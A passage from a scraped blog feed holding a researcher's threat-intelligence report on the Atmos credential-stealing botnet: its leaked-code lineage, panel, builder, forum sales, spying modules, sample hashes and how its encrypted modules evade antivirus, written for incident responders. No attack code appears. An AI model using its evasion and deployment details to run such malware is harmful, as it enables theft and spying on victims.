India [\u003Ca href=\"http:\/\/blog.escanav.com\/2016\/08\/31\/is-your-wi-fi-router-secure\/\"\u003Elink\u003C\/a\u003E] [\u003Ca href=\"http:\/\/www.pocketnewsalert.com\/2016\/08\/Linux-PnScan-How-to-Protect-escan.html\"\u003Elink\u003C\/a\u003E] [\u003Ca href=\"http:\/\/www.itvarnews.com\/2016\/08\/30\/linux-pnscan-protect\/\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003E\u003Ch2\u003E#MalwareMustDie!\u003C\/h2\u003E\u003Cbr\u003EReversed, analyzed and written by @unixfreaxjp [\u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003Elink\u003C\/a\u003E], August 23-24, 2016."},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/928146324763269747\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/08\/mmd-0054-2016-pnscan-elf-worm-that.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/928146324763269747"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/928146324763269747"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/08\/mmd-0054-2016-pnscan-elf-worm-that.html","title":"  MMD-0055-2016 - Linux\/PnScan ; ELF worm that still circles around"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/img.youtube.com\/vi\/58zr-1JU2OI\/default.jpg","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-3839139087438505773"},"published":{"$t":"2016-06-07T04:30:00.000-07:00"},"updated":{"$t":"2016-08-27T11:41:21.090-07:00"},"title":{"type":"text","$t":"MMD-0054-2016 - ATMOS botnet facts you should know"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cp\u003EThis post is about recent intelligence and sharing information of the currently emerged credential stealer and spying botnet named \"Atmos\", for the purpose of threat recognizing, incident response and may help reverse engineering. This report is the third coverage of online crime toolkit analysis series that we disclose in MalwareMustDie blog, on previous posts we disclosed about PowerZeus\/KINS [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2013\/10\/kins-source-code-for-view-download.html\"\u003Elink\u003C\/a\u003E] and ZeusVM\/KINS2 [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0036-2015-kins-or-zeusvm-v2000.html\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EAbout Atmos botnet, for the the historical reference, first publicity and thorough technical analysis of the threat was posted by Xylit0l [\u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003Elink\u003C\/a\u003E] in Xylibox blog [\u003Ca href=\"http:\/\/www.xylibox.com\/2016\/02\/citadel-0011-atmos.html\"\u003Elink\u003C\/a\u003E]. His post contains good technical details with screenshots of the botnet functions. I strongly recommend you to take a look at his post first before reading this, or before you \"google\" other posts about Atmos botnet, to have you a good correct basic background \u0026 know-how on this threat beforehand, specially to the sysadmins and incident response team.  \u003Cp\u003ETo add a few words, as a known threat expert in this field, Xylit0l is having strong dedication to follow the growth of the cyber criminal used stealer tools from \u003Ci\u003EZeus\u003C\/i\u003E, \u003Ci\u003ESpyEye\u003C\/i\u003E, \u003Ci\u003ECarberp \u003C\/i\u003Eto \u003Ci\u003ECitadel\u003C\/i\u003E with its variants, then \u003Ci\u003EKINS \u003C\/i\u003Eand \u003Ci\u003EZeusVM \u003C\/i\u003Eto now..\"\u003Cb\u003EAtmos\u003C\/b\u003E\". He knows exactly which version and what is needed to decode each encrypted configuration per version. You can follow his research on those mentioned threats in \u003Ci\u003EXylibox\u003C\/i\u003E blog post.   \u003Cp\u003EPersonally I feel his man deserves acknowledgement and respect of what he contributes, openly and freely, to help all folks in security community securing our cyber space from real crime acts. He doesn't know I am writing this, since if he knows he will yell to me not to.  \u003Cp\u003E\u003Ch2\u003EOkay, so why I posted this for?\u003C\/h2\u003E \u003Cp\u003EOur team bumped into this threat in the field, as along with investigation taken we found it's emerged too rapidly by now on some aggressive campaigns. Some recent facts of Atmos botnet was found in real incidents may need to bring up to the surface some additional facts to support IR handle on the issues. The importance raised since this threat is successfully bypassing some client security perimeters, literally. You will see snips of PoC campaign and infection details we handled in the following sections.  \u003Cp\u003E\u003Ch2\u003EWhat is this? And where Atmos name came from?\u003C\/h2\u003E \u003Cp\u003EIf I may to make a short definition: Atmos is an evolution of credential stealer toolkit, build with the complete facility meant for a crimeboss herder to operate. Period.   \u003Cp\u003E\u003Cb\u003EBy function or origin\u003C\/b\u003E \u003Cp\u003EAtmos is having a web panel with a strong nuance of Citadel colors, a server to handle the remote requests for its infection functionality, and a binary builder facility.   \u003Cp\u003EAtmos can be used as \u003Cb\u003Ehacktool\u003C\/b\u003E, or as \u003Cb\u003ERAT\u003C\/b\u003E, but it is built based from \u003Cb\u003Eform credential grabber\u003C\/b\u003E leaked codes, as added with \u003Cb\u003Escreenshot\/video capture surveillance\u003C\/b\u003E center, or, Atmos can be used as deployment center for further distribution of malware payloads too.   \u003Ci\u003E\u003Cp\u003EPoC of Atmos herder executed in infected clients to download other malware:\u003C\/i\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ZuS_o0ceHSo\/V1gpd0P8VXI\/AAAAAAAAVWo\/MK2Ykp8HwzcyV7D_f338rDb_PuGa8tFOQCLcB\/s3120\/005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ZuS_o0ceHSo\/V1gpd0P8VXI\/AAAAAAAAVWo\/MK2Ykp8HwzcyV7D_f338rDb_PuGa8tFOQCLcB\/s580\/005.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EProof that the remote command was executed in a \"report\":\u003Cbr\u003E\u003C\/i\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-s1l6MkvUtjQ\/V1gp-zCapMI\/AAAAAAAAVWw\/2YbWbLaz5kQXgMJfFRz-Ki_dGIfwaQbGgCLcB\/s3120\/006.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-s1l6MkvUtjQ\/V1gp-zCapMI\/AAAAAAAAVWw\/2YbWbLaz5kQXgMJfFRz-Ki_dGIfwaQbGgCLcB\/s580\/006.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EIn the above two screenshots a Pony malware was being pushed to Atmos bot client.\u003C\/i\u003E \u003Cp\u003EOriginated from multiple leak codes (dragged from Zeus\/Carberp\/Citadel\/KINS etc), the author managed to combine and wrap all of the bad functions from previous \u003Ci\u003E\"brands\"\u003C\/i\u003E into a new package and new name, with a bit additional handy crime tools as \"add-values\" such as: crypter interface, scan4you interface, jabber interface, and even an interface for balance management in some group management, and so on (again, read Xylibox post for the details of these functions). \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-SzNZFAopYco\/V1aWjlLGNeI\/AAAAAAAAVUg\/2Z21_wY5Q1YzIIRGYp_jo-fQ1ShfVOQogCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-SzNZFAopYco\/V1aWjlLGNeI\/AAAAAAAAVUg\/2Z21_wY5Q1YzIIRGYp_jo-fQ1ShfVOQogCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EAs per Zeus or Citadel \u003Ci\u003Ebanking credential stealer botnet\u003C\/i\u003E, Atmos is sold basically on license basis scheme to its trusted distributors, yet apparently the distributors also fetch re-sellers on their campaign. We will go to the scheme of selling this threat in the end of the post.  \u003Cp\u003E\u003Cb\u003EThe name of Atmos, how to ID the threat\u003C\/b\u003E \u003Cp\u003EThe name of \"Atmos\" came from the author of this package. It is visually recognizable if you meet this threat based on identification as per shown in each screenshots below:  \u003Cp\u003EIn the the server console:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1nMQwqVeiTI\/V1Z9bd41WxI\/AAAAAAAAVRU\/sI10uafPs3sBTA0T_yqHYmP8X8S1BFzUQCLcB\/s2120\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1nMQwqVeiTI\/V1Z9bd41WxI\/AAAAAAAAVRU\/sI10uafPs3sBTA0T_yqHYmP8X8S1BFzUQCLcB\/s580\/001.PNG\u003E\u003C\/a\u003E \u003Cp\u003EIn the builder:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-_9yu2nVXV8w\/V1aA-mN9WmI\/AAAAAAAAVRg\/JbJlOarmzDAF6WK8SVc1G36IHbyssKXuACLcB\/s2120\/002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_9yu2nVXV8w\/V1aA-mN9WmI\/AAAAAAAAVRg\/JbJlOarmzDAF6WK8SVc1G36IHbyssKXuACLcB\/s580\/002.PNG\u003E\u003C\/a\u003E \u003Cp\u003EIn the WebUI interface:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NmMBEcKGHx0\/V1aCynRyCzI\/AAAAAAAAVRs\/QJz31cT4JJQks4jQNcxdvK2PSq-Ni_W5gCLcB\/s2120\/003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NmMBEcKGHx0\/V1aCynRyCzI\/AAAAAAAAVRs\/QJz31cT4JJQks4jQNcxdvK2PSq-Ni_W5gCLcB\/s580\/003.PNG\u003E\u003C\/a\u003E \u003Cp\u003EOr, in the infection intercept module original names:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-j81zAN52JkE\/V1aPPhrK-7I\/AAAAAAAAVTY\/GfSOxnoAK3AP10OYiC_Vtji2pxxb2TgvwCLcB\/s3118\/0099.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-j81zAN52JkE\/V1aPPhrK-7I\/AAAAAAAAVTY\/GfSOxnoAK3AP10OYiC_Vtji2pxxb2TgvwCLcB\/s580\/0099.PNG\u003E\u003C\/a\u003E \u003Cp\u003EThis name wasn't known in the AntiVirus (\"AV\" in short) industry when it was around 1 or 2 months after initially spotted..by Xylit0l. Many AV marked the detected Atmos client malware as \u003Ci\u003ETrojan.Agent.something\u003C\/i\u003E or even as \u003Ci\u003ECitadel \u003C\/i\u003Eor \u003Ci\u003EZeus\u003C\/i\u003E variants, etc. I recalled it well that Xylit0l was making some contact effort to advise the correct names to the AV vendors during late 2015, that was the first time appears. He also did the same on pushing the correct names to the industry during firstly spotted KINS in the wild.  \u003Cp\u003E\u003Ch2\u003EHow Atmos bot client malware binary looks like in PEStudio (winitor.com)\u003C\/h2\u003E \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VY8SoXnUCt0\/V1gwwL8JBGI\/AAAAAAAAVXE\/UkWuz800UZwySY7u08mvbuuQm1HSzF2MACLcB\/s3120\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VY8SoXnUCt0\/V1gwwL8JBGI\/AAAAAAAAVXE\/UkWuz800UZwySY7u08mvbuuQm1HSzF2MACLcB\/s580\/007.png\u003E\u003C\/a\u003E\u003Cbr\u003E77fe3acda611f7706f5adca39cce8131ba1f8c531a33a4040931132ab122bbff  \u003Cp\u003E\u003Ch2\u003EThe campaign \u0026 new version release plan in June 2016\u003C\/h2\u003E \u003Cp\u003EAtmos distributors are recently on steroid pushing their campaign in several monitored blackhat forums since the early 2016. Some of the latest detail is about the new version that is released in this month, June 2016. Surprisingly, there is no \"fix price\" on these offers by the distributors\/sellers, as per seen in the various prices offered. Okay, to cut the crap, I am sharing some taken screenshots of the campaign below:  \u003Cp\u003EThis is complete list of feature of Atmos in a page:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-yr2rCRyTXNY\/V18ygINKVsI\/AAAAAAAAVZk\/-ccqjf-Dhwg6n68L13msxiHV4na2bkBbwCLcB\/s3120\/Untitled.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-yr2rCRyTXNY\/V18ygINKVsI\/AAAAAAAAVZk\/-ccqjf-Dhwg6n68L13msxiHV4na2bkBbwCLcB\/s580\/Untitled.png\u003E\u003C\/a\u003E \u003Cp\u003EOther campaigns mushroomed too, recent ones:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-90YePyR9pj0\/V1aGR3JvBFI\/AAAAAAAAVR4\/ahwMnL7pbLEj0WkuIJS2Xc3TY2Jje20owCLcB\/s2120\/009.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-90YePyR9pj0\/V1aGR3JvBFI\/AAAAAAAAVR4\/ahwMnL7pbLEj0WkuIJS2Xc3TY2Jje20owCLcB\/s120\/009.PNG\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-LGjrmxZa_PE\/V1aGlUYgRaI\/AAAAAAAAVSA\/nYZTeW_6YbQzXQ6myqoHn5YdRehSRGwywCLcB\/s2292\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-LGjrmxZa_PE\/V1aGlUYgRaI\/AAAAAAAAVSA\/nYZTeW_6YbQzXQ6myqoHn5YdRehSRGwywCLcB\/s120\/004.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-HDw8-4EzLMg\/V1aGz4CPECI\/AAAAAAAAVSI\/1s2c-Oru3W4wXTVVzubM-5QyRxte6TYogCLcB\/s2275\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-HDw8-4EzLMg\/V1aGz4CPECI\/AAAAAAAAVSI\/1s2c-Oru3W4wXTVVzubM-5QyRxte6TYogCLcB\/s120\/005.png\u003E\u003C\/a\u003E  \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-HowAC6LPNNA\/V1aHI2AkaqI\/AAAAAAAAVSU\/tLPWkdluV08hMCO6TyTgbfqqsRLl0Ur2ACLcB\/s2283\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-HowAC6LPNNA\/V1aHI2AkaqI\/AAAAAAAAVSU\/tLPWkdluV08hMCO6TyTgbfqqsRLl0Ur2ACLcB\/s123\/006.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-rBppYYWdgZs\/V1aHWoVoeOI\/AAAAAAAAVSg\/F5PZnE4u6m8XdP4e_9Yvqpc6ofxFzq4WQCLcB\/s2201\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-rBppYYWdgZs\/V1aHWoVoeOI\/AAAAAAAAVSg\/F5PZnE4u6m8XdP4e_9Yvqpc6ofxFzq4WQCLcB\/s120\/007.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ytuak0-vjn4\/V1aHtrhhbQI\/AAAAAAAAVSo\/Xz2w1WMBLxID6XO_Cvxn6lmRrTMu844LQCLcB\/s2120\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ytuak0-vjn4\/V1aHtrhhbQI\/AAAAAAAAVSo\/Xz2w1WMBLxID6XO_Cvxn6lmRrTMu844LQCLcB\/s120\/008.png\u003E\u003C\/a\u003E \u003Cp\u003EThe \"spoiler\" of new features for Atmos-new-release version in June 2016\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-gjwi24lnLQ4\/V18d4NKmMgI\/AAAAAAAAVZI\/oFHS4M7nELkomuv0c3madJghBgtgX2jgwCLcB\/s2249\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-gjwi24lnLQ4\/V18d4NKmMgI\/AAAAAAAAVZI\/oFHS4M7nELkomuv0c3madJghBgtgX2jgwCLcB\/s200\/Capture.PNG\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-zMDLUl7KCDc\/V18eWi0emQI\/AAAAAAAAVZQ\/jb2Oa3VRkI8SVyO3yPWMf9au84avvM7bwCLcB\/s2222\/Untitled.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-zMDLUl7KCDc\/V18eWi0emQI\/AAAAAAAAVZQ\/jb2Oa3VRkI8SVyO3yPWMf9au84avvM7bwCLcB\/s200\/Untitled.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003ESeveral facts of Atmos that we all need to know\u003C\/h2\u003E \u003Cp\u003EThis is the boring part unless you love to crack encryption of credential grabber series. Some facts posted here might help you in figuring its crypted data.  \u003Cp\u003ERussian language comments:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-h2fOLncDtW4\/V1aNizNkhNI\/AAAAAAAAVS8\/1HTn2bWkfVwS_ERqT1MEafMsLXqT3RvugCLcB\/s3120\/2001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-h2fOLncDtW4\/V1aNizNkhNI\/AAAAAAAAVS8\/1HTn2bWkfVwS_ERqT1MEafMsLXqT3RvugCLcB\/s580\/2001.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\"Online\" encryption functions:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0gYE_BOuRo4\/V1aOCR6Ay0I\/AAAAAAAAVTE\/XHsPjaTVCJo8ONl_YQ_3MjJFYHcARAXnACLcB\/s4120\/2003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0gYE_BOuRo4\/V1aOCR6Ay0I\/AAAAAAAAVTE\/XHsPjaTVCJo8ONl_YQ_3MjJFYHcARAXnACLcB\/s580\/2003.PNG\u003E\u003C\/a\u003E \u003Cp\u003EWhere the goodies are:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-woPNoiKe8co\/V1aOZfYMi2I\/AAAAAAAAVTQ\/LLeYs-wgnr8w3HfdLs_jKn-p4f8zfRR3QCLcB\/s3120\/2002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-woPNoiKe8co\/V1aOZfYMi2I\/AAAAAAAAVTQ\/LLeYs-wgnr8w3HfdLs_jKn-p4f8zfRR3QCLcB\/s580\/2002.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5saB6HvI-e4\/V1bOAKNlqUI\/AAAAAAAAVVk\/oEqkubxmMw8vWak6fd_W8-WlcOlKfgKuACLcB\/s3352\/7004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5saB6HvI-e4\/V1bOAKNlqUI\/AAAAAAAAVVk\/oEqkubxmMw8vWak6fd_W8-WlcOlKfgKuACLcB\/s580\/7004.png\u003E\u003C\/a\u003E \u003Cp\u003EThe \"config\" download traffic is something like this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-a4bgmcVU2Gs\/V1aQl0amZUI\/AAAAAAAAVTk\/wsodkvQjqjsmuklEELJOqVfLz9-vWIaFQCLcB\/s3120\/0098.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-a4bgmcVU2Gs\/V1aQl0amZUI\/AAAAAAAAVTk\/wsodkvQjqjsmuklEELJOqVfLz9-vWIaFQCLcB\/s580\/0098.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAbout this configuration data, this is spotted in the campaign aiming USA, we reported all data accordingly, we found that majority Desktop and Servers accounts of US network nodes was hacked by actors in Turkey, and the name of this config is one evidence of the targeted effort.  \u003Cp\u003E\u003Ch2\u003EAtmos interception modules\u003C\/h2\u003E \u003Cp\u003EIn an infection process, Atmos CNC serves the module to intercept spying traffics from the victims to then being installed in the compromised Windows system. Like these three modules:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-rWlFsCricwc\/V1aRw6eJBII\/AAAAAAAAVTw\/_oF6BMPUPz0k5CkckBetpeW2s0nfcsaBwCLcB\/s4469\/0097.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-rWlFsCricwc\/V1aRw6eJBII\/AAAAAAAAVTw\/_oF6BMPUPz0k5CkckBetpeW2s0nfcsaBwCLcB\/s500\/0097.PNG\u003E\u003C\/a\u003E \u003Cp\u003EPoC of the traffic during downloading, noted the module and file type used:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-j81zAN52JkE\/V1aPPhrK-7I\/AAAAAAAAVTY\/GfSOxnoAK3AP10OYiC_Vtji2pxxb2TgvwCLcB\/s3118\/0099.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-j81zAN52JkE\/V1aPPhrK-7I\/AAAAAAAAVTY\/GfSOxnoAK3AP10OYiC_Vtji2pxxb2TgvwCLcB\/s580\/0099.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-hGx1gHFp0dk\/V1aSzzDNXaI\/AAAAAAAAVT8\/Gpw3up9CXJclfhG-6Z9P5P4t7L4XkBsYQCLcB\/s3399\/2004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hGx1gHFp0dk\/V1aSzzDNXaI\/AAAAAAAAVT8\/Gpw3up9CXJclfhG-6Z9P5P4t7L4XkBsYQCLcB\/s580\/2004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AHVYxyX4u4E\/V1aTIIjjBWI\/AAAAAAAAVUE\/ibTzQ5lqQMoOikdPL6B3_DmvcA8v5mYUACLcB\/s3109\/2006.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-AHVYxyX4u4E\/V1aTIIjjBWI\/AAAAAAAAVUE\/ibTzQ5lqQMoOikdPL6B3_DmvcA8v5mYUACLcB\/s580\/2006.PNG\u003E\u003C\/a\u003E\u003Cp\u003EAnd no AV can detect these modules yet, even-though some AV made research publicity about Atmos botnet, the hashes are: \u003Cpre\u003E\u003Cbr \/\u003E74e7744a8660940da4707c89810429780d23f9ea6650be3d270264743835f39a video module\u003Cbr \/\u003E40160debd0a3b6a835e003ecf49c712c1ecd356d1037bcd46c8930ca206f6867 RAT\/VNC module\u003Cbr \/\u003E58b44c86e77461c4df3fc44c98890e30675d6ece3df07a69c30590bd7953e7d9 Firefox cookie module\u003C\/pre\u003EZero detection PoC:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-gsnrUxopL7M\/V1aVU6Kr-0I\/AAAAAAAAVUU\/OyUJZWwoMn4N7JmhCQjwhN5INhYJCLKbwCLcB\/s3120\/0096.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-gsnrUxopL7M\/V1aVU6Kr-0I\/AAAAAAAAVUU\/OyUJZWwoMn4N7JmhCQjwhN5INhYJCLKbwCLcB\/s580\/0096.png\u003E\u003C\/a\u003E\u003Cbr\u003ENoted1: VT result is not showing actual detection of Windows Antivirus, okay. \u003Cbr\u003ENoted2: The below botnet CNC screenshot shows infected clients are infected with these modules even their PCs are installed with the below AntiViruses:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ahmaK3wov_s\/V1aYtnYp9eI\/AAAAAAAAVUs\/x5WAWUft2sEO7NSXMUpo93LrXFcO_u9RQCLcB\/s3120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ahmaK3wov_s\/V1aYtnYp9eI\/AAAAAAAAVUs\/x5WAWUft2sEO7NSXMUpo93LrXFcO_u9RQCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003ETo be more precised, the evidence of the almost 80 installment sessions of the Atmost malware client that successfully bypassed above listed AntiVirus in grapgical mode is shown well too in the CNC:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-T7Jw01zBYHI\/V1bJi76EnQI\/AAAAAAAAVVY\/QrD9Q09IX4YQOjbfUZIolIUshpJqUPe_ACLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-T7Jw01zBYHI\/V1bJi76EnQI\/AAAAAAAAVVY\/QrD9Q09IX4YQOjbfUZIolIUshpJqUPe_ACLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAnd additionally one known third party (non-OS base) firewall was bypassed too:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5jgsfWV1u7U\/V1bPCGUPw2I\/AAAAAAAAVVw\/j-eLTmMLQXsRUXE-FmbSJiA_xOfVV_SkACLcB\/s2120\/7005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5jgsfWV1u7U\/V1bPCGUPw2I\/AAAAAAAAVVw\/j-eLTmMLQXsRUXE-FmbSJiA_xOfVV_SkACLcB\/s480\/7005.PNG\u003E\u003C\/a\u003E \u003Cp\u003EIn other case too:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-MVaewIZwopw\/V1ggoaBCgWI\/AAAAAAAAVWM\/JtOnemJpszIxlbvVVer-1sn6DrmpielowCLcB\/s3120\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-MVaewIZwopw\/V1ggoaBCgWI\/AAAAAAAAVWM\/JtOnemJpszIxlbvVVer-1sn6DrmpielowCLcB\/s580\/001.PNG\u003E\u003C\/a\u003E \u003Cp\u003EAnd in a fresh NEW panel found a live \"competition\" on bypassing antivirus by Atmos bot client..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-n4eouyz7vCU\/V1rC7iSJtSI\/AAAAAAAAVYc\/zus9PAodx6MOK6YIcE6_xc4IfRk6pNqZwCLcB\/s4120\/2001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-n4eouyz7vCU\/V1rC7iSJtSI\/AAAAAAAAVYc\/zus9PAodx6MOK6YIcE6_xc4IfRk6pNqZwCLcB\/s580\/2001.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Cb\u003EExplanation on low detection for the Atmos modules:\u003C\/b\u003E \u003Cp\u003EThe modules are in the Atmos encrypted form (please read Xylit0l's blog for encryption detail). The coder made it this way to make it difficult to be detected by AV's signature. Decryption will be done in the Atmos client's workspace, so theoretically it is up to the Windows OS security setting (depends on Windows OS version I guess) for allowing these modules to be installed or not. In these mentioned cases, the modules were successfully installed on Windows7.  \u003Cp\u003EIf you take a look to the Atmos post initially published in Xylibox blog by Xylit0l, it was mentioned a good tool released by friends in JP-CERT\/CC, that can be used to decode these modules before they reached the Atmos client decryption space, that may raise some chance to be detected, or blocked.  \u003Cp\u003E\u003Ch2\u003EPoC of Atmos botnet as a cybercrime tool with RAT function\u003C\/h2\u003E \u003Cp\u003EFollowing the \u003Ci\u003Elast line\u003C\/i\u003E of the previous section, this PoC is showing so many windows PC and servers with the recorded video session from the CNC server. The detail of information in this PoC video is in law enforcement accordingly.   \u003Cp\u003EThe movie is showing to you how evolution of crime tool is becoming more sophisticated today, not to only infect the victims, but spying them too by logging victims activity in a video recording sessions. Again, almost all of victims are installed with AntiVirus products, yet bypassed well by Atmos botnet to make this capture module installation.\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/QU4NFOecFAk?rel=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003ENote: Some sensitive information was cropped.  \u003Cp\u003EAfter released the above video, some says the correlation between the video and the screenshots of the AV bypassed looks unclear, true, I took them from different browsers since I had no plan to expose that far before. But well, in order to assure you there is nothing fake stuff on facts of Atmos bot client \u0026 video intercept module is fully undetected by AntiViruses, I just recorded the PoC #2 that will show you EXACTLY one panel with the bot client infecting victims, connected to panels, saving captured movie of victim's PC and you can see yourself with WHICH antiviruses the victims are installed with. See below \u0026 get some popcorn, friends :)\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/qo7dU0ulqCc?rel=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E  \u003Cp\u003E\u003Ch2\u003EMore accurate facts of Atmos botnet sales for law enforcer\u003C\/h2\u003E \u003Cp\u003EI read \u003Ci\u003Esomewhere\u003C\/i\u003E a bit incorrect statement about Atmos distribution which says: \u003Ci\u003E\"..there is at least one group of cyber criminals who is using Atmos in its attacks\"\u003C\/i\u003E ..yet after we checked ourself in \"darkweb\", the statement seems to be \"outdated\", the valid\/correct one is as below:  \u003Cp\u003E\u003Cb\u003E\u003Ci\u003E\"Atmos botnets are rented on VPS by its few trusted distributor(s) and mostly player-crooks are just buying access to that VPS, so it's not limited to one group but to anyone who have enough money and \"trust\" can start using it\"\u003C\/i\u003E\u003C\/b\u003E - I made confirmation about this too to Xylit0l.\u003Cbr\u003EThe statement is backed up by at least we collect more than ten blackhats are now on deploying (or started to deploy) Atmos botnet as the effect of the 